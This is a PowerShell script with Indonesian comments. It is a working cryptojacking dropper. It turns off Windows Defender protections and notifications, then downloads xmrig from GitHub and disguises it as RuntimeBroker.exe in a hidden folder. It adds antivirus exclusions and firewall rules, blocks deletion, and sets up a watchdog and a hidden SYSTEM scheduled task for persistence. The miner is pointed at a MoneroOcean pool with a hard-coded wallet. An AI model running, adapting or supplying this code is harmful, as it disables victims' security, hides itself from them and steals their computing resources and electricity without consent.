# ==========================================
# 1. MATIKAN TAMENG DEFENDER & NOTIFIKASI
# ==========================================
$ErrorActionPreference = "SilentlyContinue"
try { Set-MpPreference -DisableRealtimeMonitoring $true } catch {}
try { Set-MpPreference -DisableBehaviorMonitoring $true } catch {}
try { Set-MpPreference -DisableScriptScanning $true } catch {}
try { Set-MpPreference -DisableIOAVProtection $true } catch {}
try { Set-MpPreference -DisableBlockAtFirstSeen $true } catch {}

try {
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications" -Name "DisableNotifications" -Value 1 -Force
    Set-Service -Name "wscsvc" -StartupType Disabled
    Stop-Service -Name "wscsvc" -Force
} catch {}

# ==========================================
# 2. INISIALISASI DIREKTORI & MULTI-DRIVE
# ==========================================
$BaseDirs = @("$env:ProgramData\Microsoft\Windows\Templates", "$env:PUBLIC\Libraries")

$OtherDrives = Get-PSDrive -PSProvider FileSystem | Where-Object { $_.Name -ne "C" -and $_.Root -match '^[D-Z]:\\$' }
if ($OtherDrives) {
    foreach ($Drive in $OtherDrives) {
        $BaseDirs += Join-Path $Drive.Root "Microsoft\DataCache"
    }
}

$TargetDir = ""
foreach ($Dir in $BaseDirs) {
    try {
        if (!(Test-Path $Dir)) { New-Item -ItemType Directory -Force -Path $Dir | Out-Null }
        $Test = Join-Path $Dir "test.tmp"
        Set-Content -Path $Test -Value "test"
        Remove-Item -Path $Test -Force
        $TargetDir = $Dir
        break
    } catch {}
}

if (-not $TargetDir) {
    $TargetDir = Join-Path $env:TEMP "WinUpdateCache"
    if (!(Test-Path $TargetDir)) { New-Item -ItemType Directory -Force -Path $TargetDir | Out-Null }
}

$ExeName = "RuntimeBroker.exe"
$ExePath = Join-Path $TargetDir $ExeName
$ZipPath = Join-Path $env:TEMP "up.zip"
$Pool = "gulf.moneroocean.stream:10128"
$Wallet = "42imHjeSVgSG54hiTVmeGa8evmKJ55oWYgb6np1zanx5j8eoCM4vfbN9xSua1unVEV5mZCxxs637LdmVEJMs1XMFCWsHvc1"
$ArgsList = "-o $Pool -u $Wallet -p x --tls --donate-level=1 --cpu-max-threads-hint=45 --background"

# ==========================================
# 3. BERSIHKAN PROSES LAMA
# ==========================================
Get-CimInstance Win32_Process | Where-Object { $_.Path -eq $ExePath } | ForEach-Object {
    Stop-Process -Id $_.ProcessId -Force
}
Stop-Process -Name "wscript", "powershell" -Force
Unregister-ScheduledTask -TaskName "RuntimeBrokerService" -Confirm:$false
Start-Sleep -Seconds 2

# ==========================================
# 4. UNDUH & EKSTRAK BINER
# ==========================================
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$DownloadUrl = "https://github.com/MoneroOcean/xmrig_setup/raw/master/xmrig.zip"
try {
    Invoke-WebRequest -Uri $DownloadUrl -OutFile $ZipPath -ErrorAction Stop
} catch {}

if (Test-Path $ZipPath) {
    try { Expand-Archive -Path $ZipPath -DestinationPath $env:TEMP -Force } catch {}
    $Extracted = Get-ChildItem -Path $env:TEMP -Filter "xmrig.exe" -Recurse | Select-Object -First 1

    if ($Extracted) {
        Copy-Item -Force $Extracted.FullName $ExePath

        try {
            $Acl = Get-Acl $TargetDir
            $Rule = New-Object System.Security.AccessControl.FileSystemAccessRule("BUILTIN\Users", "Delete, DeleteSubdirectoriesAndFiles", "ContainerInherit,ObjectInherit", "None", "Deny")
            $Acl.AddAccessRule($Rule)
            Set-Acl $TargetDir $Acl
        } catch {}

        try { Add-MpPreference -ExclusionPath $TargetDir } catch {}
        try { Add-MpPreference -ExclusionProcess $ExeName } catch {}
        Set-ItemProperty -Path $TargetDir -Name Attributes -Value ([System.IO.FileAttributes]::Hidden + [System.IO.FileAttributes]::System)

        try {
            New-NetFirewallRule -DisplayName "Runtime Broker Out" -Direction Outbound -Program $ExePath -Action Allow | Out-Null
            New-NetFirewallRule -DisplayName "Runtime Broker In" -Direction Inbound -Program $ExePath -Action Allow | Out-Null
        } catch {}

        # Watchdog Script
        $Watcher = Join-Path $TargetDir "monitor.ps1"
        $WatcherCode = @"
`$ExePath = "$ExePath"
`$ArgsList = "$ArgsList"
while (`$true) {
    `$Run = Get-Process -Name "RuntimeBroker" -ErrorAction SilentlyContinue | Where-Object { `$_.Path -eq `$ExePath }
    if (!`$Run) {
        Start-Process -FilePath `$ExePath -ArgumentList `$ArgsList -WindowStyle Hidden
    } else {
        foreach (`$p in `$Run) { try { `$p.PriorityClass = [System.Diagnostics.ProcessPriorityClass]::Idle } catch {} }
    }
    Start-Sleep -Seconds 10
}
"@
        Set-Content -Path $Watcher -Value $WatcherCode -Force

        # VBScript Wrapper
        $Vbs = Join-Path $TargetDir "run.vbs"
        $VbsCode = @"
Dim shell
Set shell = CreateObject("Wscript.Shell")
shell.Run "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File ""$Watcher""", 0, False
"@
        Set-Content -Path $Vbs -Value $VbsCode -Force

        # Task Scheduler SYSTEM Privileges
        try {
            $Action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "`"$Vbs`""
            $Trigger = (New-ScheduledTaskTrigger -AtStartup), (New-ScheduledTaskTrigger -AtLogOn)
            $Principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType Service -RunLevel Highest
            $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden
            Register-ScheduledTask -TaskName "RuntimeBrokerService" -Action $Action -Trigger $Trigger -Principal $Principal -Settings $Settings -Force | Out-Null
        } catch {}

        Start-Process -FilePath $ExePath -ArgumentList $ArgsList -WindowStyle Hidden
    }
    Remove-Item -Force $ZipPath -ErrorAction SilentlyContinue
}
